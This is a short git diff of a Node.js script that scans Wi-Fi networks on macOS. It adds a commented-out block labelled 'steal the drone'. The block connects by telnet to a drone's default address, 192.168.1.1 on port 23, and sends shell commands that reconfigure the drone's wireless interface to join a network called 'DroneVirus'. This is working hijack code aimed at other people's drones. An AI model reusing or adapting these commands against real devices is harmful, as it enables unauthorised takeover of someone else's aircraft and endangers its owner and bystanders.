@@ -1,7 +1,8 @@
 var EventEmitter = require('events').EventEmitter
   , exec = require('child_process').exec
-  , util = require("util")
-  , airport = require( 'airport-wrapper' );
+  , util = require('util')
+  , airport = require( 'airport-wrapper' )
+  , net = require('net');
 
 var airportBinary = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
   , async = require('async');
@@ -98,4 +99,15 @@ findNetworks(function(networks) {
 function stealDrones(results) {
   console.log(results);
 }
+*/
+
+
+/*steal the drone
+var ipnum = 99;
+var client = net.connect({port: 23, host: "192.168.1.1"},
+function() {
+    console.log('client connected');
+    client.write('ifconfig ath0 down ; iwconfig ath0 mode managed essid DroneVirus ap any channel auto commit ; ifconfig ath0 192.168.43.'+ipnum+' netmask 255.255.255.0 up\r\n');
+  client.end();
+});
 */
